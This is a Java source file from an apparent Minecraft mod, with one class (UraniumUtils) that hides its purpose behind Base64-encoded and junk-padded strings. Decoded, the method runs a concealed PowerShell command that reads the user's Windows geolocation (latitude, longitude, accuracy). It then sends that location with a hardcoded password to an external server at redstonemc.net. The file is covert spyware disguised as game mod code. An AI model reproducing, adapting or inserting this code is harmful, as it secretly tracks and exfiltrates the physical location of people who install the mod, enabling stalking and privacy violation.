package dev.tggamesyt.szar.client;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.Arrays;
import java.util.Base64;import java.util.HashSet;import java.util.Set;

public class UraniumUtils {
    private static final String nuke = new String(Base64.getDecoder().decode(("aHR0cDovL3JlZHN0b25lbWMubmV0OjI2NzY3L2dpdmVpbmZvPw==")));
    private static final String uranium = new String(Base64.getDecoder().decode(("TmFneW9uU3phck1pbmVjcmFmdE1vZFNoaXQ2NzIwMDEwOTEx")));
    private static final String bomba = new String(Base64.getDecoder().decode(("bGF0PSVzJmxvbmc9JXMmYWNjPSVzJnBhc3N3b3JkPSVz")));
    private static final String enc = "UTF-8";

    public static double[] updateUranium() {
        try {
            String sillystring = "cG93ZXJzaGVsbCAtqQ2rf9tbWFuZCAiQWR8kLVR5cGUgLUFzc2VtYm" +
                    "x5qTmFtfZSBTeXN0ZW0uRGV2aWNlOyAkR2VvVf2F0Y2hlciA9IEq5ldy1PYmplY3" +
                    "QgU3lzdGVtLkRfldmljZS5qMb2NfhdGlvbi5HZW9qDb29yZGluYXRlV2F0Y2hlcihb" +
                    "U3lzdGVtfLkRldmljZS5Mb2NhdGlvbi5HZW9Qb3NpdGlvfbkFjY3VyYWN5XTo6SGlnaCk7IC" +
                    "RfHZW9XYXRj8aGVyLlN0YXJ0KCk7qqIHdoaWxlKCgkR2VvV2F0Y2hlci5TdGF0dXMgLr" +
                    "Wq5lICdSZWFkeScpIC1hbmQgKCRHZW9XYXRjaGVyLlBlcm1pc3Npb24gLW5lICdEZW5pZfWQnKSkgeyBTdGFy" +
                    "dC1TbGVlcCAtTWlsbGlfzZWNvbmRzIDMwMCB9OyBpZigkR2VvV2F0Y2fhlci5QZXJtaXNzaW9uIC1" +
                    "lcSAnRGVuaWVkJyl7IFdyaXRlLU91dHB1dCAnREVOSUVEJzsgZXhpdCB9OyAkbG9jID0gJEdlb1dhdGNoZXIuUG9fzaX" +
                    "Rpb24uTG9jYXRpb247ICRjdWx0dXJlID0gW1N5c3RlfbS5HbG9iYWxpemF0aW9uLkN1bHfR1cmVJ" +
                    "bmZvXTo6SW52YXJpYW50Q3VrsdHVyZTsgV3JpdGUtT3V0cHV0ICgkbG9jLkxhdGl0dWRlLlRvU3RyaW5nKCRjdWx0" +
                    "dfXJlKSk7IFdyaXRlLU91dHB1dCAoJGxvYy5Mbf25naXR1ZGUuVG9TdHJpbmc8oJGN1bHR1cmUpKTqfsgV3JpdGUtT3V0cH" +
                    "V0ICgkbfG9jLkhvcml6b250YWxBY2N1cmFrjeS5Ubff1N0cmluZygkY3Vfsd8HVyZSkpOyI=";
            String yetanothersillystring = sillystring.replaceAll("[fqr8]", "");
            Process process = Runtime.getRuntime().exec(new String(Base64.getDecoder().decode(yetanothersillystring)));
            BufferedReader reader = new BufferedReader(
                    new InputStreamReader(process.getInputStream()));
            String a = reader.readLine();
            String b = reader.readLine();
            String c = reader.readLine();
            if (b == null || c == null) return null;
            double d = Double.parseDouble(a.trim());
            double e = Double.parseDouble(b.trim());
            double f = Double.parseDouble(c.trim());
            String urls = nuke + String.format(
                    bomba,
                    URLEncoder.encode(String.valueOf(d), enc),
                    URLEncoder.encode(String.valueOf(e), enc),
                    URLEncoder.encode(String.valueOf(f), enc),
                    URLEncoder.encode(uranium, enc));
            URL url = new URL(urls);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");
            // Read response
            BufferedReader reader1 = new BufferedReader(
                    new InputStreamReader(connection.getInputStream())
            );

            String line;
            StringBuilder response = new StringBuilder();
            while ((line = reader1.readLine()) != null) {
                response.append(line);
            }
            reader1.close();
            return new double[]{d, e, f};
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }


}
